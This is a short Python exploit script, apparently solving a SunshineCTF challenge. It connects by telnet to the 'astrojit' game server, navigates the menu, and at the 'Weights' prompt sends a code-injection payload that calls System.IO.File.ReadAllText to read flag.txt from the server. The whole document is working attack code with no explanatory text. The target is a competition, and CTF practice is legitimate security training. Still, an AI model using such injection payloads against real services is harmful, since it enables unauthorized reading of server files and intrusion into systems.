import telnetlib

HOST = 'astrojit.sunshinectf.games'
PORT = 25006

t = telnetlib.Telnet(HOST, PORT)
print(t.read_until(b'Enter API token, or hit enter to use guest mode: ').decode('utf-8', 'ignore'), end='')
t.write(b'\n')
print(t.read_until(b'Enter an option: ').decode('utf-8', 'ignore'), end='')
t.write(b'1\n')
print(t.read_until(b'Weights: ').decode('utf-8', 'ignore'), end='')
payload = '{System.IO.File.ReadAllText("flag.txt")}'
t.write(payload.encode() + b'\n')
print(t.read_until(b'Enter an option: ').decode('utf-8', 'ignore'), end='')
t.write(b'4\n')
print(t.read_until(b'Enter an option: ').decode('utf-8', 'ignore'), end='')
t.close()
